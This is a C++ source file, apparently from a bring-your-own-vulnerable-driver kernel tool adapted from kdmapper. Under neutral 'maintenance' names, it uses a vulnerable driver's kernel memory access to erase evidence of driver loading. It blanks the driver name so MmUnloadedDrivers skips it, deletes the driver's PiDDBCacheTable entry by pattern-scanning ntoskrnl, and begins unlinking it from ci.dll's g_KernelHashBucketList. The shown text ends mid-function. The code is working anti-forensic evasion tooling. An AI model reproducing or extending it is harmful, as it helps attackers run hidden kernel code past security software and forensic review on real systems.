#include "hinv_maintenance.hpp"
#include "hinv_kmem.hpp"
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <iostream>
#include <cwctype>
#include <algorithm>
#include <cstring>
#include <cstddef>
#include <cstdio>
#include <fstream>
#include <filesystem>
#include <unordered_set>

// Kernel structure layouts and pattern bytes below are ported from
// TheCruZ/kdmapper (intel_driver.cpp / nt.hpp, MIT), validated live against
// Windows 11 26200 during development.

namespace hinv {
namespace maintenance {

// ---------------------------------------------------------------------------
// Kernel structure layouts (x64)
// ---------------------------------------------------------------------------

struct KRTL_BALANCED_LINKS {
    KRTL_BALANCED_LINKS* Parent;
    KRTL_BALANCED_LINKS* LeftChild;
    KRTL_BALANCED_LINKS* RightChild;
    char  Balance;
    uint8_t Reserved[3];
};

struct KRTL_AVL_TABLE {
    KRTL_BALANCED_LINKS BalancedRoot;
    void*    OrderedPointer;
    uint32_t WhichOrderedElement;
    uint32_t NumberGenericTableElements;
    uint32_t DepthOfTree;
    void*    RestartKey;
    uint32_t DeleteCount;
    void*    CompareRoutine;
    void*    AllocateRoutine;
    void*    FreeRoutine;
    void*    TableContext;
};

struct PiDDBCacheEntry {
    LIST_ENTRY     List;
    UNICODE_STRING DriverName;
    uint32_t       TimeDateStamp;
    NTSTATUS       LoadStatus;
    char           _pad[16];
};

struct HashBucketEntry {
    HashBucketEntry* Next;
    UNICODE_STRING   DriverName;
    uint32_t         CertHash[5];
};

struct SystemHandle {
    void*    Object;
    HANDLE   UniqueProcessId;
    HANDLE   HandleValue;
    uint32_t GrantedAccess;
    uint16_t CreatorBackTraceIndex;
    uint16_t ObjectTypeIndex;
    uint32_t HandleAttributes;
    uint32_t Reserved;
};

struct SystemHandleInformationEx {
    size_t       HandleCount;
    size_t       Reserved;
    SystemHandle Handles[1];
};

constexpr ULONG SystemExtendedHandleInformationClass = 64;

static_assert(offsetof(PiDDBCacheEntry, TimeDateStamp) == 0x20, "PiDDBCacheEntry layout drifted");
static_assert(offsetof(PiDDBCacheEntry, LoadStatus) == 0x24, "PiDDBCacheEntry layout drifted");
static_assert(offsetof(KRTL_AVL_TABLE, DeleteCount) == 0x40, "RTL_AVL_TABLE layout drifted");
static_assert(offsetof(HashBucketEntry, DriverName) == 0x8, "HashBucketEntry layout drifted");

// ---------------------------------------------------------------------------
// Small helpers
// ---------------------------------------------------------------------------

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

static uint64_t FindModuleBase(const wchar_t* moduleName) {
    std::wstring target = ToLower(moduleName);
    for (const auto& m : kmem::EnumKernelModules()) {
        if (ToLower(m.name) == target) return m.base;
    }
    return 0;
}

// A resolved global/function must stay inside its owning module's image — a
// wrong pattern match must never become a wild kernel access or call.
static bool IsInModule(uint64_t moduleBase, uint64_t va) {
    for (const auto& m : kmem::EnumKernelModules()) {
        if (m.base == moduleBase && m.size <= UINT64_MAX - moduleBase)
            return va >= moduleBase && va < moduleBase + m.size;
    }
    return false;
}

static bool IsSupportedMaintenanceBuild(uint32_t build) {
    switch (build) {
        case 19041: case 19042: case 19043: case 19044: case 19045:
        case 22000: case 22621: case 22631: case 26100: case 26200:
            return true;
        default:
            return false;
    }
}

static bool IsSupportedUnloadPreventionBuild() {
    // The private KLDR_DATA_TABLE_ENTRY offset below has been disassembled and
    // validated only on the Win11 26200 family. A base build number is the
    // strongest version identity available through RtlGetVersion here; every
    // other build fails closed rather than zeroing an unrelated pool object.
    const auto os = kmem::GetOsVersion();
    return os.major == 10 && os.build == 26200;
}

static bool IsKernelPointer(uint64_t value) {
    return value != 0 && (value >> 48) == 0xFFFF;
}

// Locate a section of a loaded module by name. Returns its kernel VA.
static uint64_t FindModuleSection(byovd::IByovdBackend* backend, uint64_t moduleBase,
                                  const char* sectionName, uint32_t& outSize) {
    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(moduleBase, &dos, sizeof(dos))) return 0;
    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(moduleBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;

    uint16_t numSections = nt.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
    uint64_t sectionTable = moduleBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return 0;

    for (const auto& sec : sections) {
        if (std::strncmp(reinterpret_cast<const char*>(sec.Name), sectionName, IMAGE_SIZEOF_SHORT_NAME) == 0) {
            outSize = sec.Misc.VirtualSize;
            return moduleBase + sec.VirtualAddress;
        }
    }
    return 0;
}

static bool PatternMatch(const uint8_t* data, const std::vector<uint8_t>& pattern, const std::vector<bool>& mask) {
    for (size_t i = 0; i < pattern.size(); ++i) {
        if (mask[i] && data[i] != pattern[i]) return false;
    }
    return true;
}

static uint64_t FindPattern(byovd::IByovdBackend* backend, uint64_t begin, uint32_t size,
                            const std::vector<uint8_t>& pattern, const std::vector<bool>& mask) {
    if (pattern.size() != mask.size() || pattern.empty() || !size) return 0;

    constexpr size_t CHUNK = 0x1000;
    std::vector<uint8_t> buffer(CHUNK + pattern.size());

    for (uint32_t off = 0; off < size; off += CHUNK) {
        uint32_t readSize = (off + CHUNK > size) ? (size - off) : CHUNK;
        readSize = static_cast<uint32_t>(readSize + pattern.size());
        if (off + readSize > size) readSize = size - off;

        if (!backend->ReadKernelMemory(begin + off, buffer.data(), readSize)) continue;

        for (size_t i = 0; i + pattern.size() <= readSize; ++i) {
            if (PatternMatch(buffer.data() + i, pattern, mask)) return begin + off + i;
        }
    }
    return 0;
}

// Resolve the target of `lea reg, [rip + rel32]` at leaVa (REX.W 8D /r form).
static uint64_t ResolveLeaTarget(byovd::IByovdBackend* backend, uint64_t leaVa) {
    uint32_t relRaw = 0;
    if (!kmem::ReadU32(backend, leaVa + 3, relRaw)) return 0;
    int32_t rel = static_cast<int32_t>(relRaw);
    return leaVa + 7 + rel;
}

// ---------------------------------------------------------------------------
// Kernel call wrappers (kmem::CallKernelFunction — NtAddAtom hook underneath)
// ---------------------------------------------------------------------------

static hinv::kmem::KernelCallStatus KAcquireResourceExclusive(
    byovd::IByovdBackend* backend, uint64_t lockVa, bool& acquired) {
    acquired = false;
    static uint64_t fn = 0;
    if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAcquireResourceExclusiveLite");
    if (!fn) return kmem::KernelCallStatus::NotExecuted;
    uint8_t out = 0;
    const auto status = kmem::CallKernelFunction(backend, &out, fn, lockVa, 1ULL);
    acquired = status == kmem::KernelCallStatus::Executed && out != 0;
    return status;
}

static kmem::KernelCallStatus KReleaseResource(byovd::IByovdBackend* backend, uint64_t lockVa) {
    static uint64_t fn = 0;
    if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "ExReleaseResourceLite");
    if (!fn) return kmem::KernelCallStatus::NotExecuted;
    return kmem::CallKernelFunction<void>(backend, nullptr, fn, lockVa);
}

static kmem::KernelCallStatus KLookupAvl(byovd::IByovdBackend* backend, uint64_t tableVa,
                                         void* userEntry, uint64_t& outEntry) {
    outEntry = 0;
    static uint64_t fn = 0;
    if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "RtlLookupElementGenericTableAvl");
    if (!fn) return kmem::KernelCallStatus::NotExecuted;
    const auto status = kmem::CallKernelFunction(
        backend, &outEntry, fn, tableVa, reinterpret_cast<uint64_t>(userEntry));
    return status;
}

static kmem::KernelCallStatus KDeleteAvl(byovd::IByovdBackend* backend, uint64_t tableVa,
                                         uint64_t entryVa, bool& deleted) {
    deleted = false;
    static uint64_t fn = 0;
    if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "RtlDeleteElementGenericTableAvl");
    if (!fn) return kmem::KernelCallStatus::NotExecuted;
    uint8_t out = 0;
    const auto status = kmem::CallKernelFunction(backend, &out, fn, tableVa, entryVa);
    deleted = status == kmem::KernelCallStatus::Executed && out != 0;
    return status;
}

static kmem::KernelCallStatus KFreePool(byovd::IByovdBackend* backend, uint64_t va) {
    static uint64_t fn = 0;
    if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "ExFreePool");
    if (!fn) return kmem::KernelCallStatus::NotExecuted;
    return kmem::CallKernelFunction<void>(backend, nullptr, fn, va);
}

class ExclusiveResourceGuard {
public:
    ExclusiveResourceGuard(byovd::IByovdBackend* backend, uint64_t lockVa)
        : backend_(backend), lockVa_(lockVa) {}

    ExclusiveResourceGuard(const ExclusiveResourceGuard&) = delete;
    ExclusiveResourceGuard& operator=(const ExclusiveResourceGuard&) = delete;

    bool Release() {
        if (!acquired_ || released_) return releaseStatus_ == kmem::KernelCallStatus::Executed;
        if (kernelStateUncertain_) return false;
        releaseStatus_ = KReleaseResource(backend_, lockVa_);
        released_ = true;
        return releaseStatus_ == kmem::KernelCallStatus::Executed;
    }

    void MarkAcquired() { acquired_ = true; }
    void MarkKernelStateUncertain() { kernelStateUncertain_ = true; }

    ~ExclusiveResourceGuard() {
        // All normal paths call Release so its status is propagated. The
        // destructor is the last line of defence for early returns and still
        // attempts the release while the backend is alive.
        if (acquired_ && !released_ && !kernelStateUncertain_) {
            releaseStatus_ = KReleaseResource(backend_, lockVa_);
            released_ = true;
        }
    }

private:
    byovd::IByovdBackend* backend_ = nullptr;
    uint64_t lockVa_ = 0;
    bool acquired_ = false;
    bool released_ = false;
    bool kernelStateUncertain_ = false;
    kmem::KernelCallStatus releaseStatus_ = kmem::KernelCallStatus::NotExecuted;
};

// ---------------------------------------------------------------------------
// Driver file timestamp (for the PiDDB AVL lookup)
// ---------------------------------------------------------------------------

uint32_t GetDriverFileTimestamp(const std::wstring& driverPath) {
    std::ifstream file(std::filesystem::path(driverPath), std::ios::binary);
    if (!file.is_open()) return 0;

    std::vector<uint8_t> headers(0x1000, 0);
    file.read(reinterpret_cast<char*>(headers.data()), headers.size());
    if (file.gcount() < 0x200) return 0;

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(headers.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    int64_t ntOff = static_cast<int64_t>(dos->e_lfanew);
    if (ntOff < 0 || ntOff + static_cast<int64_t>(sizeof(IMAGE_NT_HEADERS64)) > static_cast<int64_t>(headers.size()))
        return 0;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(headers.data() + ntOff);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    return nt->FileHeader.TimeDateStamp;
}

// ---------------------------------------------------------------------------
// MmUnloadedDrivers — DISABLED for post-unload processing (fail-closed)
// ---------------------------------------------------------------------------
//
// The array layout is build-dependent and it is only written by
// MiRememberUnloadedDriver at unload time. Instead of parsing it, the backend
// calls PrepareDriverUnload() before unload, zeroing the driver name in
// its own KLDR_DATA_TABLE_ENTRY so the trace is never recorded (kdmapper
// approach, validated live on build 26200).

bool ProcessUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring& driverName) {
    (void)backend; (void)driverName;
    std::wcerr << L"[hinv::maintenance] MmUnloadedDrivers post-unload processing is DISABLED "
               << L"(handled by PrepareDriverUnload at backend unload)\n";
    return false;
}

bool PrepareDriverUnload(byovd::IByovdBackend* backend, HANDLE deviceHandle,
                         DriverUnloadState* state) {
    kmem::Trace("maintenance: prevent begin");
    if (state) *state = {};
    if (!state || !backend || !deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) {
        kmem::Trace("maintenance: prevent bail (args)");
        return false;
    }
    if (!IsSupportedUnloadPreventionBuild()) {
        std::wcerr << L"[hinv::maintenance] MmUnloadedDrivers prevention is disabled on this Windows build\n";
        kmem::Trace("maintenance: prevent bail (unsupported build)");
        return false;
    }

    auto NtQuerySystemInformation = reinterpret_cast<NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG)>(reinterpret_cast<void*>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
    if (!NtQuerySystemInformation) { kmem::Trace("maintenance: prevent bail (resolve)"); return false; }

    // Find our own device handle's kernel object via the extended handle table.
    // This class reports only the header size (56) on a null-buffer call; the
    // real requirement arrives in ReturnLength of a too-small fill call — so
    // use one in/out size variable and loop until the growing table fits.
    ULONG size = 0;
    std::vector<uint8_t> buffer;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    for (int tries = 0; tries < 16 && status == STATUS_INFO_LENGTH_MISMATCH; ++tries) {
        status = NtQuerySystemInformation(SystemExtendedHandleInformationClass,
                                          buffer.empty() ? nullptr : buffer.data(),
                                          static_cast<ULONG>(buffer.size()), &size);
        if (status == STATUS_INFO_LENGTH_MISMATCH && size) buffer.assign(size, 0);
    }
    if (!NT_SUCCESS(status) || buffer.empty()) {
        char dbg[96];
        std::snprintf(dbg, sizeof(dbg), "maintenance: prevent bail (query status=0x%08lX size=%lu)",
                      static_cast<unsigned long>(status), static_cast<unsigned long>(size));
        kmem::Trace(dbg);
        return false;
    }

    uint64_t fileObject = 0;
    auto* info = reinterpret_cast<SystemHandleInformationEx*>(buffer.data());
    const size_t headerSize = offsetof(SystemHandleInformationEx, Handles);
    const size_t maxHandles = buffer.size() >= headerSize
        ? (buffer.size() - headerSize) / sizeof(SystemHandle)
        : 0;
    if (info->HandleCount > maxHandles) {
        kmem::Trace("maintenance: prevent bail (handle table bounds)");
        return false;
    }
    for (size_t i = 0; i < info->HandleCount; ++i) {
        const auto& h = info->Handles[i];
        if (h.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
            continue;
        if (h.HandleValue == deviceHandle) {
            fileObject = reinterpret_cast<uint64_t>(h.Object);
            break;
        }
    }
    if (!fileObject) { kmem::Trace("maintenance: prevent bail (handle not found)"); return false; }

    // FILE_OBJECT +0x8 -> DEVICE_OBJECT +0x8 -> DRIVER_OBJECT +0x28 ->
    // KLDR_DATA_TABLE_ENTRY; its BaseDllName UNICODE_STRING lives at +0x58.
    uint64_t deviceObject = 0, driverObject = 0, driverSection = 0;
    if (!IsKernelPointer(fileObject) ||
        !kmem::ReadU64(backend, fileObject + 0x8, deviceObject) ||
        !IsKernelPointer(deviceObject)) {
        kmem::Trace("maintenance: prevent bail (device)"); return false;
    }
    if (!kmem::ReadU64(backend, deviceObject + 0x8, driverObject) ||
        !IsKernelPointer(driverObject)) {
        kmem::Trace("maintenance: prevent bail (driver)"); return false;
    }
    if (!kmem::ReadU64(backend, driverObject + 0x28, driverSection) ||
        !IsKernelPointer(driverSection)) {
        kmem::Trace("maintenance: prevent bail (section)"); return false;
    }

    UNICODE_STRING name{};
    const uint64_t nameFieldVa = driverSection + 0x58;
    if (!backend->ReadKernelMemory(nameFieldVa, &name, sizeof(name)) ||
        name.Length == 0 || (name.Length & 1) != 0 ||
        name.MaximumLength < name.Length || name.Length > 1024 ||
        !IsKernelPointer(reinterpret_cast<uint64_t>(name.Buffer))) {
        kmem::Trace("maintenance: prevent bail (name)"); return false;
    }

    std::vector<wchar_t> nameBuf(name.Length / 2 + 1, 0);
    if (!backend->ReadKernelMemory(reinterpret_cast<uint64_t>(name.Buffer),
                                   nameBuf.data(), name.Length)) {
        kmem::Trace("maintenance: prevent bail (name read)");
        return false;
    }
    std::wcout << L"[hinv::maintenance] Arming MmUnloadedDrivers prevention for " << nameBuf.data() << L"\n";

    // Length == 0 makes MiRememberUnloadedDriver skip recording the unload.
    UNICODE_STRING zeroed = name;
    zeroed.Length = 0;
    bool ok = backend->WriteKernelMemory(nameFieldVa, &zeroed, sizeof(zeroed));
    if (ok) {
        UNICODE_STRING verify{};
        ok = backend->ReadKernelMemory(nameFieldVa, &verify, sizeof(verify)) &&
             verify.Length == 0 && verify.Buffer == name.Buffer &&
             verify.MaximumLength == name.MaximumLength;
    }
    if (ok && state) {
        state->armed = true;
        state->nameFieldVa = nameFieldVa;
        state->originalName = name;
    }
    kmem::Trace(ok ? "maintenance: unload prevention armed" : "maintenance: unload prevention failed");
    return ok;
}

bool RestoreDriverUnload(byovd::IByovdBackend* backend,
                         DriverUnloadState& state) {
    if (!state.armed) return true;
    if (!backend || !state.nameFieldVa) return false;
    if (!backend->WriteKernelMemory(state.nameFieldVa, &state.originalName,
                                    sizeof(state.originalName)))
        return false;
    UNICODE_STRING verify{};
    if (!backend->ReadKernelMemory(state.nameFieldVa, &verify, sizeof(verify)) ||
        std::memcmp(&verify, &state.originalName, sizeof(verify)) != 0)
        return false;
    state = {};
    return true;
}

// ---------------------------------------------------------------------------
// PiDDBCacheTable (RTL_AVL_TABLE since ~1607) — kdmapper patterns + AVL delete
// ---------------------------------------------------------------------------

bool ProcessPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverName, uint32_t driverFileTimestamp) {
    if (!backend || driverName.empty() || !kmem::KernelCallsUsable()) return false;

    uint64_t ntosBase = FindModuleBase(L"ntoskrnl.exe");
    if (!ntosBase) return false;

    uint32_t pageSize = 0;
    uint64_t pageVa = FindModuleSection(backend, ntosBase, "PAGE", pageSize);
    if (!pageVa || !pageSize) return false;

    // PiDDBLock patterns (lea rcx, PiDDBLock sits at a fixed offset in each).
    uint64_t lockVa = 0;
    {
        // build <= 22000: ... B2 01 48 8D 0D ?? ?? ?? ?? E8 — lea at match+28
        std::vector<uint8_t> pat = { 0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88, 0, 0, 0, 0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0, 0, 0, 0,
                                     0x66, 0xFF, 0x88, 0, 0, 0, 0, 0xB2, 0x01, 0x48, 0x8D, 0x0D, 0, 0, 0, 0, 0xE8, 0, 0, 0, 0, 0x4C, 0x8B, 0, 0x24 };
        std::vector<bool>   msk = { 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0,
                                    1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1 };
        uint64_t m = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (m) lockVa = ResolveLeaTarget(backend, m + 28);
    }
    if (!lockVa) {
        // build 22449+: second 48 8D 0D at match+16
        std::vector<uint8_t> pat = { 0x48, 0x8B, 0x0D, 0, 0, 0, 0, 0x48, 0x85, 0xC9, 0x0F, 0x85, 0, 0, 0, 0,
                                     0x48, 0x8D, 0x0D, 0, 0, 0, 0, 0xE8, 0, 0, 0, 0, 0xE8 };
        std::vector<bool>   msk = { 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0,
                                    1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1 };
        uint64_t m = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (m) lockVa = ResolveLeaTarget(backend, m + 16);
    }
    if (!lockVa) {
        // build 26100+: 48 8D 0D at match+19
        std::vector<uint8_t> pat = { 0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88, 0, 0, 0, 0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0, 0, 0, 0,
                                     0x48, 0x8D, 0x0D, 0, 0, 0, 0, 0xB2, 0x01, 0x66, 0xFF, 0x88, 0, 0, 0, 0, 0x90, 0xE8, 0, 0, 0, 0, 0x4C, 0x8B, 0, 0x24 };
        std::vector<bool>   msk = { 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0,
                                    1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1 };
        uint64_t m = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (m) lockVa = ResolveLeaTarget(backend, m + 19);
    }

    // PiDDBCacheTable patterns.
    uint64_t tableVa = 0;
    {
        std::vector<uint8_t> pat = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };
        std::vector<bool>   msk = { 1, 1, 1, 1, 1, 1 };
        uint64_t m = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (m) tableVa = ResolveLeaTarget(backend, m + 3);
    }
    if (!tableVa) {
        std::vector<uint8_t> pat = { 0x48, 0x8B, 0xF9, 0x33, 0xC0, 0x48, 0x8D, 0x0D };
        std::vector<bool>   msk = { 1, 1, 1, 1, 1, 1, 1, 1 };
        uint64_t m = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (m) tableVa = ResolveLeaTarget(backend, m + 5);
    }

    if (!lockVa || !tableVa || !IsInModule(ntosBase, lockVa) || !IsInModule(ntosBase, tableVa)) {
        std::wcerr << L"[hinv::maintenance] PiDDB globals not located on this build\n";
        return false;
    }
    // The table pattern is only 6 bytes — weak. Before taking the lock and
    // calling into the AVL routines, sanity-check the candidate: a real
    // RTL_AVL_TABLE has a CompareRoutine inside ntoskrnl's .text and a
    // plausible element count. A false positive here would otherwise become an
    // RtlLookup/Delete on garbage → bugcheck.
    {
        uint64_t cmp = 0;
        uint32_t elemCount = 0;
        if (!kmem::ReadU64(backend, tableVa + offsetof(KRTL_AVL_TABLE, CompareRoutine), cmp) ||
            !kmem::ReadU32(backend, tableVa + offsetof(KRTL_AVL_TABLE, NumberGenericTableElements), elemCount) ||
            !IsInModule(ntosBase, cmp) || elemCount > 0x100000) {
            std::wcerr << L"[hinv::maintenance] PiDDBCacheTable candidate failed sanity check, aborting\n";
            return false;
        }
    }
    std::cout << "[hinv::maintenance] PiDDBLock=0x" << std::hex << lockVa << " PiDDBCacheTable=0x" << tableVa << std::dec << "\n";

    kmem::Trace("maintenance: piddb lock acquire");
    bool acquired = false;
    const auto acquireStatus = KAcquireResourceExclusive(backend, lockVa, acquired);
    if (acquireStatus != kmem::KernelCallStatus::Executed || !acquired) {
        std::wcerr << L"[hinv::maintenance] Failed to lock PiDDBLock\n";
        return false;
    }
    ExclusiveResourceGuard resource(backend, lockVa);
    resource.MarkAcquired();
    kmem::Trace("maintenance: piddb locked");

    bool processed = false;

    // The kernel stores the driver file name; try with and without extension.
    std::wstring fileName = driverName;
    size_t slash = fileName.find_last_of(L"\\/");
    if (slash != std::wstring::npos) fileName = fileName.substr(slash + 1);
    std::wstring stem = fileName;
    size_t dot = stem.find_last_of(L'.');
    if (dot != std::wstring::npos) stem = stem.substr(0, dot);

    for (const std::wstring& variant : { fileName, stem }) {
        if (variant.empty()) continue;

        PiDDBCacheEntry local{};
        local.TimeDateStamp = driverFileTimestamp;
        local.DriverName.Buffer = const_cast<PWSTR>(variant.c_str());
        local.DriverName.Length = static_cast<USHORT>(variant.size() * sizeof(wchar_t));
        local.DriverName.MaximumLength = local.DriverName.Length + sizeof(wchar_t);

        uint64_t entry = 0;
        const auto lookupStatus = KLookupAvl(backend, tableVa, &local, entry);
        if (lookupStatus != kmem::KernelCallStatus::Executed) {
            if (lookupStatus == kmem::KernelCallStatus::RestorationUncertain)
                resource.MarkKernelStateUncertain();
            break;
        }
        if (!entry) continue;

        std::cout << "[hinv::maintenance] PiDDB entry found at 0x" << std::hex << entry << std::dec << "\n";
        kmem::Trace("maintenance: piddb entry found");

        // Unlink from the list first, then remove from the AVL tree.
        uint64_t prev = 0, next = 0;
        if (!kmem::ReadU64(backend, entry + offsetof(PiDDBCacheEntry, List.Blink), prev) ||
            !kmem::ReadU64(backend, entry + offsetof(PiDDBCacheEntry, List.Flink), next) || !prev || !next)
            break;

        uint64_t prevNext = 0, nextPrev = 0;
        if (!kmem::ReadU64(backend, prev + offsetof(LIST_ENTRY, Flink), prevNext) ||
            !kmem::ReadU64(backend, next + offsetof(LIST_ENTRY, Blink), nextPrev) ||
            prevNext != entry || nextPrev != entry) {
            std::wcerr << L"[hinv::maintenance] PiDDB list links failed validation\n";
            break;
        }

        auto restoreList = [&]() {
            bool ok = kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), entry);
            ok = kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), entry) && ok;
            return ok;
        };

        if (!kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), next))
            break;
        if (!kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), prev)) {
            if (!kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), entry))
                resource.MarkKernelStateUncertain();
            break;
        }

        bool deleted = false;
        const auto deleteStatus = KDeleteAvl(backend, tableVa, entry, deleted);
        if (deleteStatus != kmem::KernelCallStatus::Executed || !deleted) {
            std::wcerr << L"[hinv::maintenance] PiDDB AVL delete state is uncertain; aborting\n";
            const bool listRestored = restoreList();
            if (deleteStatus == kmem::KernelCallStatus::RestorationUncertain || !listRestored)
                resource.MarkKernelStateUncertain();
            break;
        }
        kmem::Trace("maintenance: piddb avl deleted");
        processed = true;
        break;
    }

    const bool releaseOk = resource.Release();
    if (!releaseOk) {
        std::wcerr << L"[hinv::maintenance] Failed to release PiDDBLock\n";
        return false;
    }
    kmem::Trace(processed ? "maintenance: piddb done (processed)" : "maintenance: piddb done (not found)");

    if (processed) std::wcout << L"[hinv::maintenance] PiDDBCacheTable processed for " << driverName << L"\n";
    return processed;
}

// ---------------------------------------------------------------------------
// g_KernelHashBucketList (ci.dll) — kdmapper patterns + list unlink
// ---------------------------------------------------------------------------

bool ProcessKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring& driverName) {
    if (!backend || driverName.empty() || !kmem::KernelCallsUsable()) return false;

    uint64_t ciBase = FindModuleBase(L"ci.dll");
    if (!ciBase) return false;

    uint32_t pageSize = 0;
    uint64_t pageVa = FindModuleSection(backend, ciBase, "PAGE", pageSize);
    if (!pageVa || !pageSize) return false;

    // g_KernelHashBucketList: 48 8B 1D ?? ?? ?? ?? EB ?? F7 43 40 00 20 00 00
    uint64_t bucketListVa = 0;
    uint64_t matchVa = 0;
    {
        std::vector<uint8_t> pat = { 0x48, 0x8B, 0x1D, 0, 0, 0, 0, 0xEB, 0, 0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00 };
        std::vector<bool>   msk = { 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1 };
        matchVa = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (matchVa) {
            // mov rbx, [rip+rel32] at match: rel32 at +3, len 7
            uint32_t relRaw = 0;
            if (kmem::ReadU32(backend, matchVa + 3, relRaw))
                bucketListVa = matchVa + 7 + static_cast<int32_t>(relRaw);
        }
    }
    if (!bucketListVa) {
        std::wcerr << L"[hinv::maintenance] g_KernelHashBucketList not located on this build\n";
        return false;
    }

    // g_HashCacheLock: a `lea rcx, [rip+rel]` shortly BEFORE the list reference
    // (kdmapper scans [sig-50, sig)). Scanning past matchVa could catch a lea
    // AFTER the signature and resolve the wrong ERESOURCE — unlinking the list
    // under the wrong lock is a race with CI.
    uint64_t hashLockVa = 0;
    {
        uint64_t scanStart = (matchVa > pageVa + 56) ? (matchVa - 56) : pageVa;
        uint8_t window[64]{};
        if (backend->ReadKernelMemory(scanStart, window, sizeof(window))) {
            for (size_t i = 0; i + 7 <= sizeof(window); ++i) {
                if (scanStart + i >= matchVa) break; // never scan past the signature
                if (window[i] == 0x48 && window[i + 1] == 0x8D && window[i + 2] == 0x0D) {
                    hashLockVa = ResolveLeaTarget(backend, scanStart + i);
                    break;
                }
            }
        }
    }
    if (!hashLockVa || !IsInModule(ciBase, bucketListVa) || !IsInModule(ciBase, hashLockVa)) {
        std::wcerr << L"[hinv::maintenance] g_HashCacheLock not located on this build\n";
        return false;
    }
    std::cout << "[hinv::maintenance] g_KernelHashBucketList=0x" << std::hex << bucketListVa
              << " g_HashCacheLock=0x" << hashLockVa << std::dec << "\n";

    kmem::Trace("maintenance: hashbucket lock acquire");
    bool acquired = false;
    const auto acquireStatus = KAcquireResourceExclusive(backend, hashLockVa, acquired);
    if (acquireStatus != kmem::KernelCallStatus::Executed || !acquired) {
        std::wcerr << L"[hinv::maintenance] Failed to lock g_HashCacheLock\n";
        return false;
    }
    ExclusiveResourceGuard resource(backend, hashLockVa);
    resource.MarkAcquired();
    kmem::Trace("maintenance: hashbucket locked");

    bool processed = false;

    std::wstring fileName = ToLower(driverName);
    size_t slash = fileName.find_last_of(L"\\/");
    if (slash != std::wstring::npos) fileName = fileName.substr(slash + 1);
    std::wstring stem = fileName;
    size_t dot = stem.find_last_of(L'.');
    if (dot != std::wstring::npos) stem = stem.substr(0, dot);

    uint64_t prev = bucketListVa; // the global holds the first entry pointer
    uint64_t entry = 0;
    std::unordered_set<uint64_t> visited;
    if (kmem::ReadU64(backend, prev, entry)) {
        for (int iterations = 0; entry; ++iterations) {
            if (iterations >= 4096 || !visited.insert(entry).second) {
                std::wcerr << L"[hinv::maintenance] g_HashCacheList cycle/length limit reached\n";
                break;
            }
            uint16_t nameLen = 0;
            if (!backend->ReadKernelMemory(entry + offsetof(HashBucketEntry, DriverName.Length), &nameLen, sizeof(nameLen)) || !nameLen)
                break;
            uint64_t namePtr = 0;
            if (!kmem::ReadU64(backend, entry + offsetof(HashBucketEntry, DriverName.Buffer), namePtr) || !namePtr)
                break;
            std::vector<wchar_t> nameBuf(nameLen / 2 + 1, 0);
            if (!backend->ReadKernelMemory(namePtr, nameBuf.data(), nameLen))
                break;

            std::wstring entryName = ToLower(nameBuf.data());
            // Exact match only: a substring test makes "foo.sys" hit
            // "foobar.sys", and an empty stem would match every entry.
            if (entryName == fileName || (!stem.empty() && entryName == stem)) {
                uint64_t next = 0;
                if (!kmem::ReadU64(backend, entry, next)) break;
                uint64_t current = 0;
                if (!kmem::ReadU64(backend, prev, current) || current != entry) break;
